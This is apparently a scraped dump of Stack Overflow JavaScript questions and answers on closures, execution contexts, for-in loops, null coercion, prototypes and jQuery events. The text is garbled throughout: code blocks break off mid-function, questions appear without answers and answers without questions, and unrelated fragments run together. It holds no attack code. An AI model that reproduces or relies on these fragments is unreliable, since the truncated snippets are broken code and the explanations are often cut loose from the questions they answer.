<li><p>This case occurs when a token is allowed by some production of the grammar, but the production is a <em>restricted production</em>, a semicolon is automatically inserted before the restricted token.</p></li>
</ol>

<p>Restricted productions:</p>

<pre><code>PostfixExpression :
    LeftHandSideExpression [no LineTerminator here] ++
    LeftHandSideExpression [no LineTerminator here] --

ContinueStatement :
    continue [no LineTerminator here] Identifieropt ;

BreakStatement :
    break [no LineTerminator here] Identifieropt ;

ReturnStatement :
    return [no LineTerminator here] Expressionopt ;

ThrowStatement :
    throw [no LineTerminator here] Expression ;

<blockquote>

<p>Are two different concepts, an execution context is created just before a piece of code (which <a href=""http://bclary.com/2004/11/07/#a-10.1.2"">can be</a> either global code, function code or eval code) is executed.</p>

<p>I think this might be easier to explain with your code:</p>

<pre><code>var a = 1;
(function(x) {        // Step 1
   function inner() {
      alert(a);
      alert(x);

<p>In the <strong>Step 1</strong>, the anonymous function is <a href=""http://bclary.com/2004/11/07/#a-13.2""><em>created</em></a>, the current scope (only containing the global object) is stored in this moment on the function <code>[[Scope]]</code> property.</p>

<p>In the <strong>Step 2</strong>, this anonymous function is executed, a new execution context is created (a <a href=""http://bclary.com/2004/11/07/#a-10.2.3"">function code execution context</a>), at this moment a new lexical environment is created (the Variable Object of this function is created), all function argument identifiers (in this case only <code>x</code>), identifiers of function declarations (<code>inner</code>) and identifiers of variable declarations  (<code>y</code>) are bound as non-deletable properties of this new variable object (which is the new lexical scope).</p>

<p>In the <strong>Step 3</strong> the <code>inner</code> function is executed, this creates a new execution context, another Variable Object is injected into the scope chain, but in this case since nothing is declared inside <code>inner</code> and it doesn't have any formal parameters, it will be just an empty object.</p>

    }, false);
});

","5445","","<p>That's because jQuery uses its own <a href=""http://api.jquery.com/category/events/event-object/"">Event model</a>.</p>

<p>jQuery simply copies and normalizes <em>some properties</em> from the original event, to the event object that you get as the first argument of the handler.</p>

<p>The copied properties are based on the <a href=""http://www.w3.org/TR/2003/WD-DOM-Level-3-Events-20030331/ecma-script-binding.html"">DOM Level 3 Events Spec</a>.</p>

<p>To get the original event object, you can:</p>

<pre><code>$(document).ready (function () {
    $(""#test"").bind(""touchmove"", function (event) {
        var e = event.originalEvent;
        console.log(e.targetTouches[0].pageX);
    });
});
</code></pre>

<p>The <code>originalEvent</code> property is accessible and it will work, but is not documented, you can see how it's set behind the scenes in the <a href=""http://github.com/jquery/jquery/blob/master/src/event.js#L548""><code>jQuery.Event</code></a> constructor.</p>

"<p>There are plenty of solutions on how to get the indexOf implementation into the Array prototype so that it works under Internet Explorer, however I've stumbled upon an issue that doesn't seem to be addressed anywhere I've looked so far.</p>

        var from = Number(arguments[1]) || 0;
        from = (from &lt; 0) ? Math.ceil(from) : Math.floor(from);
        if (from &lt; 0)
            from += len;

        for (; from &lt; len; from++)
        {
            if (from in this &amp;&amp; this[from] === elt)  
                return from;
        }

var i = [1,2,3,4];

for (j in i)
{
    alert(i[j]);

In Firefox and Chrome, that's exactly what I see, however in IE8 I get an additional alert containing the indexOf function code.</p>

","5445","","<p>This happens because in IE, since the method doesn't exist, then it is added to the <code>Array.prototype</code>, and it remains being enumerable.</p>

"<p><strong>TLDR</strong> I have a function that runs on the end of a pan in an openlayers map. Don't want it to fire continously.</p>

<hr>

<p>I have a function that runs on the end of panning a map.
I want it so that it will not fire the function until say 3 secconds after the pan has finished. Although I don't want to queue up the function to fire 10 or so times like setTimeout is currently doing.</p>

<p><strong>How can I delay a function from running for n seconds then run it only once no matter how many times it has been called?</strong></p>

<pre><code>    map.events.register(""moveend"", map, function() {
      setTimeout(SetLocation, 5000);
    });
</code></pre>

<p>Moveend:</p>

<pre><code>moveend - triggered after a drag, pan, or zoom completes
</code></pre>

<p>The code <em>above</em> even using setTimeout(func, delay); still fires multiple times when it runs. How can I prevent this?</p>

<hr>
","5445","","<p>Well, meeting your requirements, you could build a simple function wrapper:</p>

<pre><code>var executeOnce = (function (fn, delay) {
  var executed = false;
  return function (/* args */) {
    var args = arguments;
    if (!executed) {
      setTimeout(function () {
        fn.apply(null, args); // preserve arguments
      }, delay);
      executed = true;
    }
  };
});
</code></pre>

<p>Usage examples:</p>

<p>With your code:</p>

<pre><code>map.events.register(""moveend"", map, executeOnce(SetLocation, 5000));
</code></pre>

<p>Other usages:</p>

<pre><code>var wrappedFn = executeOnce(function (a, b) {
  alert(a + ' ' + b);
}, 3000);

wrappedFn('hello', 'world');
wrappedFn('foo', 'bar'); // this won't be executed...
</code></pre>

<p>The wrapped function will be delayed the specified amount of time and executed only once.</p>

"<p>Ok, I am using <code>insertRow</code> to insert a TR element into a table, but for some reason it doesn't count that inserted TR element as a sibling of the others when I do nextSibling on it.</p>

<p>For example, consider the following table.</p>

<pre><code>&lt;table id=""myTable""&gt;
    &lt;tr id=""row_0""&gt;
        &lt;td colspan=""3""&gt;Row 1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr id=""tr_0_0""&gt;
        &lt;td&gt;Option 1&lt;/td&gt;
        &lt;td&gt;Option2&lt;/td&gt;
        &lt;td&gt;Option 3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr id=""tr_0_1""&gt;
        &lt;td&gt;Option 1&lt;/td&gt;
        &lt;td&gt;Option 2&lt;/td&gt;
        &lt;td&gt;Option 3&lt;/td&gt;
    &lt;/tr&gt;
&lt;/table&gt;
</code></pre>

<p>So after I do this:</p>

<pre><code>var lTable = document.getElementById(""myTable"");
var trEle = lTable.insertRow(-1);
trEle.id = ""tr_0_2"";

var cell1 = trEle.insertCell(0);
cell1.innerHTML = ""Option 1"";

var cell2 = trEle.insertCell(1);
cell2.innerHTML = ""Option 2"";

var cell3 = trEle.insertCell(-1);
cell3.innerHTML = ""Option 3"";
</code></pre>

<p>Then I use this approach to get all of the siblings, but it NEVER gives me the last sibling in here, but ONLY if it's been added via insertRow, because it gets all nextSiblings just fine, but once I add a sibling via insertRow it never gives me that last Sibling, argggg....</p>

<pre><code>var tempTr = document.getElementById(""row_0"");
var totalSibs = 0;

while(tempTr.nextSibling != null)
{

    var tempId = tempTr.id;

    // If no id, not an element, or not a tr_0 id.
    if (!tempId || tempTr.nodeType != 1 || tempId.indexOf(""tr_0"") != 0)
    {
        tempTr = tempTr.nextSibling;
        continue;
    }

    // This NEVER ALERTS the last id of the row that was inserted using insertRow, arggg.
    alert(tempId);

    totalSibs++;

    tempTr = tempTr.nextSibling;
}
</code></pre>

<p>So, <code>totalSibs</code> should return 3 because after I inserted the row, there should be 3 Siblings, but instead returns 2 and never counts the 3rd Sibling.... arggg.</p>

<p>Can someone please help me here??</p>

<p>Thank You, you guys/gals are Awesome!</p>
","5445","","<p>The problem is at the last iteration, you set the <code>tempTr</code> to the next sibling, (which is actually the last <code>tr</code>), but you check the again the <code>nextSibling</code> in your <code>while</code> condition, in that last case it will be <code>null</code>, finishing the loop.</p>

<p>Change your <code>while</code> condition to:</p>

<pre><code>while (tempTr != null) {
  //...
}
</code></pre>

<p>Or simply:</p>

<pre><code>while (tempTr) {
  //...

"<p>I have a makeshift events system in JS and the attacher looks like this:</p>

"<p>I wrote the following code for a project that I'm working on:</p>

<pre><code>var clicky_tracking = [
  ['related-searches', 'Related Searches'],

  ['web-headlines', 'Publication']
];

for (var x = 0, length_x = clicky_tracking.length; x &lt; length_x; x++) {

                  .getElementsByTagName('a');

    links[y].onclick = (function(name, url) {

        clicky.log(url, name, 'outbound');
      };
    }(clicky_tracking[x][1], links[y].href));
  }
}
</code></pre>

<p>What I'm trying to do is:</p>

<ul>
<li>define a two-dimensional array, with each instance the inner arrays containing two elements: an <code>id</code> attribute value (e.g., ""related-searches"") and a corresponding description (e.g., ""Related Searches"");</li>
<li>for each of the inner arrays, find the element in the <code>document</code> with the corresponding <code>id</code> attribute, and then gather a collection of all <code>&lt;a&gt;</code> elements (hyperlinks) within it;</li>
<li>loop through that collection and attach an <code>onclick</code> handler to each hyperlink, which should call <code>clicky.log</code>, passing in as parameters the description that corresponds to the <code>id</code> (e.g., ""Related Searches"" for the <code>id</code> ""related-searches"") and the value of the <code>href</code> attribute for the <code>&lt;a&gt;</code> element that was clicked.</li>
</ul>

<p>Hopefully that wasn't thoroughly confusing! The code may be more self-explanatory than that.</p>

<p>I believe that what I've implemented here is a closure, but JSLint complains:</p>

<p>So, my questions are:</p>

<ul>
<li>How can I refactor this code to make JSLint agreeable? Or, better yet, is there a best-practices way to do this that I'm missing, regardless of what JSLint thinks?</li>
<li>Should I rely on event delegation instead? That is, attaching <code>onclick</code> event handlers to the <code>document</code> elements with the <code>id</code> attributes in my arrays, and then looking at <code>event.target</code>? I've done that once before and understand the theory, but I'm very hazy on the details, and would appreciate some guidance on what that would look like - assuming this is a viable approach.</li>
</ul>

<p>Thanks very much for any help!</p>
","5445","","<p>You could create a function to build the event handlers, e.g.:</p>

<pre><code>function createClickHandler(url, name) {
  return function () {
    clicky.log(url, name, 'outbound');
  };
}

for (var x = 0, length_x = clicky_tracking.length; x &lt; length_x; x++) {
  links = document.getElementById(clicky_tracking[x][0]) // NOTE:links should be 
                  .getElementsByTagName('a');            // declared at the top
  for (var y = 0, length_y = links.length; y &lt; length_y; y++) {
    links[y].onclick = createClickHandler(clicky_tracking[x][1], links[y].href);
  }

"<p>I had to write a routine that increments the value of a variable by 1 if its type is <code>number</code> and assigns 0 to the variable if not, where the variable is initially <code>null</code> or <code>undefined</code>.</p>

<p>The first implementation was <code>v &gt;= 0 ? v += 1 : v = 0</code> because I thought anything not a number would make an arithmetic expression false, but it was wrong since <code>null &gt;= 0</code> is evaluated to true. Then I learned <code>null</code> behaves like 0 and the following expressions are all evaluated to true.</p>

<ul>
<li><code>null &gt;= 0 &amp;&amp; null &lt;= 0</code></li>
<li><code>!(null &lt; 0 || null &gt; 0)</code></li>
<li><code>null + 1 === 1</code></li>
<li><code>1 / null === Infinity</code></li>
<li><code>Math.pow(42, null) === 1</code></li>
</ul>

<p>Of course, <code>null</code> is not 0. <code>null == 0</code> is evaluated to false. This makes the seemingly tautological expression <code>(v &gt;= 0 &amp;&amp; v &lt;= 0) === (v == 0)</code> false.</p>

<p>Why is <code>null</code> like 0, although it is not actually 0?</p>
","5445","","<p>Your real question seem to be:</p>

<p>Why:</p>

<pre><code>null &gt;= 0; // true
</code></pre>

<p>But:</p>

<pre><code>null == 0; // false
</code></pre>

<p>What really happens is that the <em>Greater-than-or-equal Operator</em>  (<code>&gt;=</code>), performs type coercion (<a href=""http://bclary.com/2004/11/07/#a-9.1""><code>ToPrimitive</code></a>), with a <em>hint</em> type of <code>Number</code>, actually all the relational operators have this behavior.</p>

<p>You can see the inner details of this process in the <a href=""http://bclary.com/2004/11/07/#a-11.8.5"">The Abstract Relational Comparison Algorithm</a>.</p>

<p><strong>Edit:</strong> In response to your comment:</p>

<p>That's because <code>null</code> is treated in a special way by the <em>Equals Operator</em> (<code>==</code>).</p>

<p>In a brief, it only <em>coerces</em> to <code>undefined</code>:</p>

<pre><code>null == null; // true
null == undefined; // true
</code></pre>

<p>All other values you mention are subject to numeric type coercion, all of them coerce to zero.</p>

","5445","","<p>Even if you have only the HTML text, you can still use the DOM to parse it. For example, using a temporary element to inject the HTML and traverse the options:</p>

<pre><code>function extractOptions(html) {
  var el = document.createElement('div'), // temporary element
      result = [], select, option;

  el.innerHTML = html; // inject html
  select = el.getElementsByTagName('select')[0]; // get the first select element

  for (var i = 0, n = select.options.length; i &lt; n; i++) { // loop options
    option = select.options[i];
    result.push({value: option.value, text: option.innerHTML});
  }
  return result;
}

// assuming that text contains the HTML string as in your example

var options = extractOptions(text);

// [{""value"":""blah"",""text"":""one""},
//  {""value"":""mehh"",""text"":""two""},
//  {""value"":""rawr"",""text"":""three""}]

","5445","","<p>First question: IMO, using an assignment on the condition of the <code>if</code> statement, might cause confusion, also if <code>myVar</code> is not declared previously with the <code>var</code> statement it might become a global variable.</p>

<p>This is how actually <code>var</code> behaves in your code:</p>

<pre><code>var Y; // declared and initialized with `undefined`

if (myVar = img.parent('a').length &gt; 0) {
  Y = 1; // assignment
} else {
  Y = 2; // assignment

<p>You can observe this behavior with the following example:</p>

<pre><code>var Y = 'foo';
(function () {
  alert(Y); //alerts `undefined`
  var Y;
})();
</code></pre>

<p>As you see, the <code>alert</code> is before the <code>var</code> declaration in that function, but since the <code>var</code> statement is <em>hoisted</em>, the <code>Y</code> variable from this new scope is set up before the execution, when the <a href=""http://bclary.com/2004/11/07/#a-10.1.3"" rel=""nofollow"">Variable Instantiation</a> process takes place.</p>

<p>The most straight forward approach, would be to declare and assign <code>myVar</code>:</p>

<pre><code>var Y, myVar = img.parent('a').length &gt; 0;

if (myVar) {
  Y = 1;
} else {
  Y = 2;

<p>For example, by augmenting Function.prototype, we can make a method available to all functions:</p>

     this.prototype[name] = func;
     return this;

","5445","","<p>Well, ugliness is subjective, but let's see.</p>

<p>You usually write:</p>

<pre><code>function Foo () {}
Foo.prototype.method1 = function ()  { /*...*/ };

<p>You extend the <code>prototype</code> object a <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Guide/Working_with_Objects#Using_a_Constructor_Function"">constructor function</a> with the properties that you want to be inherited to the instances created by the new operator.</p>

<p>For example with <code>var obj = new Foo();</code> you are creating an instance of the <code>Foo</code> constructor, that object will inherit the all the properties bound to the <code>Foo.prototype</code> object and other objects higher in the <a href=""http://mckoss.com/jscript/object.htm"">prototype chain</a>.</p>

<p>The Crockford's method does the same, that method is defined in the <code>Function.prototype</code> object, all functions inherit from that object, so you can call the method like this:</p>

<pre><code>function Foo () {}
Foo.method('method1', function () { /*...*/ });
Foo.method('method2', function () { /*...*/ });

"<p>I'm looking for a barebones javascript example that demonstrates how the javascript plugin architecture works with large javascript libraries (such as raphael or jquery). In either scenario, you build plugins by ensuring your custom plugin follows this pattern: <code>jQuery.fn.pluginName</code> -- so assume I have a library:</p>

    //my fancy javascript code
    return function() {
        //my return object

<p>And now I have included a reference to my plugin in my page:</p>

<pre><code>myLibrary.fn.simplePlugin = function() { //more fancy code }
</code></pre>

<p>So finally, I can just call:</p>

<pre><code>lib.simplePlugin();

    // ensure to use the `new` operator
    if (!(this instanceof myLibrary))

  // create `fn` alias and define some ""core"" methods

    init: function () {/*...*/}
    //...
  };
  // expose the library
  window.myLibrary = myLibrary;
})();

"<p>before I ask my question I wanted to let everybody know that I appreciate the fact that there's always somebody out there willing to help, and on my end I'll try to give back to the community as much as I can. Thanks</p>

<p>Now, I would like to get some pointers as to how to properly take advantage of the ""for...in"" loop in JavaScript, I already did some research and tried a couple things but it is still not clear to me how to properly use it.</p>

<p>Let's say I have a random number of ""select"" tags in an HTML form, and I don't require the user to select an option for all of them, they can leave some untouched if they want.
However I need to know if they selected none or at least one.</p>

<p>The way I'm trying to find out if the user selected any of them is by using the ""for...in"" loop. For example:</p>

<pre><code>var allSelected = $(""select option:selected"");
var totalSelected = $(""select option:selected"").length;
</code></pre>

<p>The first variable produces an array of all the selected options.
The second variable tells me how many selected options I have in the form (select tags could be more than one and it changes every time).
Now, in order to see if any has been selected I loop through each element (selected option), and retrieve the ""value"" attribute. The default ""option"" tag has a value=""0"", so if any selected option returns a value greater than 0, I know at least one option has been selected, however it does not have to be in order, this is my loop so far:</p>

<pre><code>for(var i = 0; i &lt; totalSelected; i++){
  var eachOption = $(allSelected[i]).val();
  var defaultValue = 0;
  if(eachOption == defaultValue){
    ...redirect to another page
  }else if(eachOption &gt; defaultValue){
    ... I display an alert
  }
}
</code></pre>

<p>My problem here is that as soon as the ""if"" matches a 0 value, it sends the user to the next page without testing the rest of the elements in the array, and the user could have selected the second or third options.</p>

<p>What I really want to do is check all the elements in the array and then take the next action, in my mind this is how I could do it, but I'm not getting it right:</p>

<pre><code>var randomValue = 25;  
for(randomValue in allSelected){
  var found = true;
  var notFound = false
  if(found){
    display an alert
  }else{
    redirect to next page
  }
}
</code></pre>

<p>This loop or the logic I'm using are flawed (I'm pretty sure), what I want to do is test all the elements in the array against a single variable and take the next action accordingly.</p>

<p>I hope this makes some sense to you guys, any help would be appreciated.<br>
Thanks,<br>

","5445","","<p>You should know that the <code>for-in</code> statement in JavaScript is meant to <strong>enumerate</strong> object properties.</p>

<p>When you want to <strong>iterate</strong> over an array-like<sup>1</sup> object, a sequential loop (<a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Statements/for"" rel=""nofollow""><code>for</code></a>, <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Statements/while"" rel=""nofollow""><code>while</code></a>, <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Statements/do...while"" rel=""nofollow""><code>do...while</code></a>) is always recommended.</p>

<p>I think this comes down to a more fundamental question - that is, without being part of an assignment statement, will JavaScript still evaluate a property's value? Does this depend on whether a particular browser's JavaScript engine optimizes the code?</p>
","5445","","<p>The statement will still be evaluated.</p>

<pre>

<p>In the above statement, you can see that <code>document</code> is a <a href=""http://bclary.com/2004/11/07/#a-11.1.2"" rel=""nofollow"">Identifier Reference</a>, which is a <a href=""http://bclary.com/2004/11/07/#a-11.1"" rel=""nofollow"">Primary Expression</a>.</p>

<p>Then the property accessor operator is used (<code>.</code>) too lookup the <code>body</code> property and then the <code>offsetLeft</code> property.</p>

<p>You are not doing an <code>AssignmentExpression</code> but the statement will be evaluated because the Identifier Reference is resolved, and the properties are looked up.</p>

<p>Also, host objects, can implement <em>accessor properties</em> that can have a logic <code>get</code> and <code>set</code> methods, not just simple <em>value properties</em>.</p>

<p>In ECMAScript 3, we didn't had the power of creating <em>accessor properties</em>, only the host objects could implement them, but the 5th Edition of the standard allows us to do it.</p>

<p>For example to illustrate:</p>

","5445","","<p>You need to persist the <code>this</code> value, you can do it in many ways, jQuery 1.4+ provides you the <a href=""http://api.jquery.com/jQuery.proxy/"" rel=""nofollow""><code>$.proxy</code></a> method, e.g.:</p>

"<p>In Java you can use a <code>for()</code> loop to go through objects in an array like so:</p>

<pre><code>String[] myStringArray = {""Hello"",""World""};
for(String s : myStringArray)
{
    //Do something
}
</code></pre>

<p>Can you do the same in JavaScript?</p>
","5445","","<p>Use a sequential <code>for</code> loop:</p>

<pre><code>var myStringArray = [""Hello"",""World""];
var arrayLength = myStringArray.length;
for (var i = 0; i &lt; arrayLength; i++) {
    alert(myStringArray[i]);
    //Do something
}
</code></pre>

<p>@zipcodeman suggests the use of the <code>for...in</code> statement, but for iterating arrays <code>for-in</code> should be avoided, that statement is meant to <strong>enumerate</strong> object properties.</p>

<p>It shouldn't be used for array-like objects because:</p>

<ul>
<li>The order of iteration is not guaranteed, the array indexes may not be visited in numeric order.</li>
<li>Inherited properties are also enumerated.</li>
</ul>

<p>The second point is that it can give you a lot of problems, for example, if you extend the <code>Array.prototype</code> object to include a method there, that property will be also enumerated.</p>

<p>For example:</p>

<pre><code>Array.prototype.foo = ""foo!"";
var array = ['a', 'b', 'c'];

for (var i in array) {
  alert(array[i]);
}
</code></pre>

<p>The above code will alert, ""a"", ""b"", ""c"" and ""foo!"".</p>

<p>That be particularly a problem if you use some library that relies heavily on native prototypes augmention (such as MooTools for example).</p>

<p>The <code>for-in</code> statement as I said before is there to <em>enumerate</em> object properties, for example:</p>

<pre><code>var obj = {
  ""a"": 1,
  ""b"": 2,
  ""c"": 3
};

for (var prop in obj) {
  if (obj.hasOwnProperty(prop)) { 
  // or if (Object.prototype.hasOwnProperty.call(obj,prop)) for safety...
    alert(""prop: "" + prop + "" value: "" + obj[prop])
  }
}
</code></pre>

<p>In the above example the <code>hasOwnProperty</code> method allows you to enumerate only <em>own properties</em>, that's it, only the properties that the object physically has, no inherited properties.</p>

<p>I would recommend you to read the following article:</p>

<p>That new object is <em>not a function</em>, therefore it doesn't have a <code>prototype</code> property and it cannot be invoked.</p>

","5445","","<p>Well, you can enumerate all object properties using the <code>for...in</code> statement, for example:</p>

<pre><code>if (typeof Object.keys != 'function') {
  Object.keys = function (obj) {
    var result = [];
    for (var prop in obj) {
      if (Object.prototype.hasOwnProperty.call(obj, prop)) {
        result.push(prop);
      }
    }
    return result;
  };
}

alert(Object.keys({foo: 1, bar: 2})); // ""foo, bar"";

"<p>Is that possible to pass variable into regular expression pattern string in jquery ( or javascript)? For example, I want to validate a zip code input field every time while user type in a character by passing variable i to the regular expression pattern. How to do it right?</p>

"<p>I've been trying to learn closures (in Javascript), which kind of hurts my brain after way too many years with C# and C++.  I think I now have a basic understanding, but one thing bothers me: I've visited lots of websites in this Quest for Knowledge, and nowhere have I seen a word (or even a simple two-word phrase) that means ""a set of Javascript closures that share a common execution context"".  For example:</p>

<pre>
function CreateThingy (name, initialValue)
{
    var myName = name;
    var myValue = initialValue;

    var retObj = new Object;

    retObj.getName = function() { return myName; }
    retObj.getValue = function() { return myValue; }
    retObj.setValue = function(newValue) { myValue = newValue; }

    return retObj;
};
</pre>

<p>From what I've read, this seems to be one common way of implementing data hiding.  The value returned by CreateThingy is, of course, an object, but what would you call the set of functions which are properties of that object?  Each one is a closure, but I'd like a name I can used to describe (and think about) all of them together as one conceptual entity, and I'd rather use a commonly accepted name than make one up.  </p>

<p>Thanks!</p>

","5445","","<p>Crockford popularized the term ""<a href=""http://www.crockford.com/javascript/private.html"" rel=""nofollow"">privileged method</a>"" to name the functions that have access to the scope of its constructor (where the private members are declared).</p>

<p>I would call them <em>""A set of JavaScript functions that share a common enclosing scope""</em>.</p>

"<p>I'm very confused with javascript methods defined in objects and the ""this"" keyword. </p>

<p>In the below example, the toString() method is invoked when Mammal object instantiated:</p>

<pre><code>function Mammal(name){ 
this.name=name;
this.toString = function(){
    return '[Mammal ""'+this.name+'""]';

}
} 

var someAnimal = new Mammal('Mr. Biggles');
alert('someAnimal is '+someAnimal);
</code></pre>

<p>Despite the fact that the toString() method is not invoked on the object someAnimal like this:</p>

<pre><code>alert('someAnimal is '+someAnimal.toString());
</code></pre>

<p>It still returns 'someAnimal is [Mammal ""Mr. Biggles""]' . That doesn't make sense to me because the toString() function is not being called anywhere. </p>

<p>Then to add even more confusion, if I change the toString() method to a method I make up such as random():</p>

<pre><code>function Mammal(name){ 
this.name=name;
this.random = function(){
    return Math.floor(Math.random() * 15);
}
} 

var someAnimal = new Mammal('Mr. Biggles');
alert(someAnimal); 
</code></pre>

<p>It completely ignores the random method (despite the fact that it is defined the same way was the toString() method was) and returns: [object object]</p>

<p>Another issue I'm having trouble understanding with inheritance is the value of ""this"". For example, in the below example</p>

<pre><code>function person(w,h){
    width.width = w;
    width.height = h;
}

function man(w,h,s) { 
person.call(this, w, h); 
    this.sex = s;
}
</code></pre>

<p>""this"" keyword is being send to the person object clearly. However, does ""this"" refer to the subclass (man) or the super class (person) when the person object receives it? </p>

<p>Thanks for clearing up any of the confusion I have with inheritance and object literals in javascript. </p>
","5445","","<p>The behavior you are experiencing with the <code>toString</code> method is caused because when you do a <em>string concatenation</em>, the object is converted <em>implicitly</em> to String (by the <a href=""http://bclary.com/2004/11/07/#a-9.1"" rel=""nofollow""><code>ToPrimitive</code></a> internal operation, using hint type ""String"").</p>

<p>That method invokes another internal operation, <a href=""http://bclary.com/2004/11/07/#a-15.2.4.2"" rel=""nofollow""><code>[[DefaultValue]](hint)</code></a>.</p>

<p>If the <em>hint type</em> is String, that operation explicitly gets the <code>toString</code> property and invokes it.</p>

<p>If your object doesn't explicitly define a <code>toString</code> method, the method will still be resolved higher in the prototype chain, <code>""[object Object]""</code> is the result of the <a href=""http://bclary.com/2004/11/07/#a-15.2.4.2"" rel=""nofollow"">Object.prototype.toString</a> method.</p>

<p>For example:</p>

<pre><code>var obj = {
  toString:function () {
    return ""hello"";
  }
};

alert(obj + ' world');
// will alert ""hello world""
</code></pre>

<p>Now, about the <code>this</code> value:</p>

<p>The way you are constructing your objects is also known as <em>constructor chaining</em>, the <code>this</code> value will refer to a new object that inherits from the constructor's prototype that you called with the <code>new</code> operator.</p>

<p>The invocation of the other constructor with <code>call</code> will just make that all the property  assignments made to the <code>this</code> value inside the called function, are actually made on the new object from the first constructor, that doesn't really affect the prototype chain, for example:</p>

<pre><code>function Person(w,h){
  this.width = w;
  this.height = h;
}

function Man(w,h,s) { 
  Person.call(this, w, h); // will just apply the width and height assignments
  this.sex = s;
}

var person = new Person(1,2);
person instanceof Person; // true
person instanceof Man; // false

var man = new Man(1,2,3);
person instanceof Person; // false
person instanceof Man; // true
</code></pre>

<p><strong>Edit:</strong> To clarify more, when you invoke <code>Person.call(this, ...);</code> it just calls that function to make the assignments of properties of the <code>this</code> value (<code>this.width</code> and <code>this.height</code> on your example) on that function, to the object passed as the first argument of <code>call</code>, a simplified example:</p>

<pre><code>function Test () {
  this.foo = 1;
  this.bar = 2;
  this.baz = 3;
}

var obj = { foo: 0 }; // a simple object
Test.call(obj);
// now obj looks like this: {foo: 1, bar: 2,baz: 3}
</code></pre>

          }
</code></pre>

<p>then how can you get an array of names of those functions?  That is, an array</p>

<pre><code>[""foo"", ""bar"", ... ]
</code></pre>

","5445","","<p><strong>Edit:</strong> I've slightly misread the question, you want to extract the names of <em>only</em> the properties that are function objects:</p>

  toString : function() { return ""1""; },
  valueOf : function() { return 2; }
  toLocaleString : function() { return ""3""; }

"<p>I have written a simple jQuery script that changes the hash tag of a link. I do this because I am using IntenseDebate comments in Wordpress but the comment link still links replaced id of the old comments. I'm using jQuery so that if javascript is enabled, the user can click on the comments link and it will take them to the IntenseDebate comments. If its not enabled it will take them to the traditional comments (because IntenseDebate requires javascript to function).</p>

Currently the URL ""someurl.com/<strong>#respond</strong>"" but I need the script to change it to ""someurl.com/<strong>#comments</strong>"".

I could see that the link I was trying to change was now correct, and I could click on it and it worked as I desired.  So what I don't understand is why the code is not executing when it is supposed to. I am using $(document).ready() and I have other jQuery on the page that executes just fine. I even tested it on a simple HTML page away from all the problems that might be caused by Wordpress and I received the same result. Does anyone know why this might be happening?</p>

<p><sub><strong>Note:</strong> This is not a language data type, is an internal mechanism to handle references.</sub></p>

<p>A reference is composed of two elements, the <em>base object</em> and a <em>property name</em>.</p>

<p>In your example, the <code>foo.bar</code> reference looks like this.</p>

<pre><code>// pseudo-code
foo.bar = {
  baseObject: foo,
  propertyName: 'bar'
}
</code></pre>

<p>Both, the <a href=""http://bclary.com/2004/11/07/#a-11.14"">comma operator</a> and a <a href=""http://bclary.com/2004/11/07/#a-11.13.1"">simple assignment</a>, rely on getting the value of the property name, that causes the base object to be lost, since a single value is returned (this is made through the internal <a href=""http://bclary.com/2004/11/07/#a-8.7.1""><code>GetValue</code></a> operation).</p>

<p>This is how the internal <code>GetValue</code> operation works:</p>

<pre><code>// pseudo-code
GetValue(V) :
  if (Type(V) != Reference) return V;

  baseObject = GetBase(V); // in your example foo
  if (baseObject === null) throw ReferenceError;

  return baseObject.[[Get]](GetPropertyName(V)); 
  // equivalent to baseObject[v.PropertyName];
</code></pre>

<p>As you see, a <em>value</em> is returned, so the original reference is lost.</p>

<p><strong>Edit:</strong> The key to understand why <code>(foo.bar = foo.bar)();</code> is not equivalent to <code>foo.bar();</code> relies in the <a href=""http://bclary.com/2004/11/07/#a-11.13.1"">Simple Assignment</a> Operator, let's see the algorithm:</p>

<pre>
<strong>11.13.1 Simple Assignment (`=`)</strong>
The production `AssignmentExpression` :
               `LeftHandSideExpression` = `AssignmentExpression`

is evaluated as follows:

1. Evaluate LeftHandSideExpression.

2. Evaluate AssignmentExpression.

<strong>3.Call GetValue(Result(2)).</strong>

4.Call PutValue(Result(1), Result(3)).

<strong>5.Return Result(3).</strong>
</pre>

<p>Basically when you make <code>(foo.bar = foo.bar)</code> the actual assignment (<strong>Step 4.</strong>) has no effect because  <code>PutValue</code> will only get the value of the reference and will place it back, with the same base object.</p>

<p>The key is that the assignment operator returns (<strong>Step 5</strong>) the value obtained in the <strong>Step 3</strong> and as I said before in the <code>GetValue</code> pseudo-code, this internal method returns a <em>value</em> which doesn't really have a <em>base object</em>.</p>

"<p>I have a document.onclick function that I would like to have a delay.  I can't seem to get the syntax right.</p>

<p>my original code is </p>

<pre><code>&lt;script type=""text/javascript""&gt;
document.onclick=check;

function check(e){do something}
</code></pre>

<p>I tried the below, but that code is incorrect, the function did not execute and nothing happened.</p>

<pre><code>&lt;script type=""text/javascript""&gt;
document.onclick=setTimeout(""check"", 1000);

function check(e){do something}
</code></pre>

<p>I tried the next set, the function got executed, but no delay.</p>

<pre><code>&lt;script type=""text/javascript""&gt;
setTimeout(document.onclick=check, 1000);

function check(e){do something}
</code></pre>

<p>what is the correct syntax for this code.</p>

<p>TIA</p>

<p>Edit:</p>

<p>The solutions were all good, my problem was that I use the function check to obtain the id of the element being clicked on. But after the delay, there is no ""memory"" of what was being clicked on, so the rest of the function does not get executed.  Jimr wrote the short code to preserve clicked event.</p>

<p>The code that is working (not work in IE6)</p>

<pre><code>document.onclick = makeDelayedHandler( check, 1000 );
// Delay execution of event handler function ""f"" by ""time"" ms.
function makeDelayedHandler( f, time)
{
  return function( e )
  {
    var ev = e || window.event;
    setTimeout( function()
    {
      f( ev );
    }, time );        
  };
}


function check(e){ 
var click = (e &amp;&amp; e.target) || (event &amp;&amp; event.srcElement);

"<p>I made a simple javascript class like this:</p>

<pre><code>function Horse() {
    this.color = 'brown';
    this.speed = 'somewhat slow';
}
</code></pre>

<p>I attached a few instances to some elements, like this:</p>

<pre><code>$(""#horse1"").data('d', new Horse());
$(""#horse2"").data('d', new Horse());
$(""#horse3"").data('d', new Horse());
</code></pre>

<p>now I want to create a JSON array with a JSON representation of each horse object. So I'm doing this:</p>

<pre><code>// How do I create an empty JSON array here?:
var myJsonArray = ?;

var children = $(""#horses"").children();
for (var i = 0, m = children.size(); i &lt; m; i++) {
    var panel = children[i];
    var horse = $(panel).data('h');

    // And how do I create a JSON rep of my horse here?
    var myJsonHorse = new JsonHorse(?);

    // Finally, how do I add it to the json array?
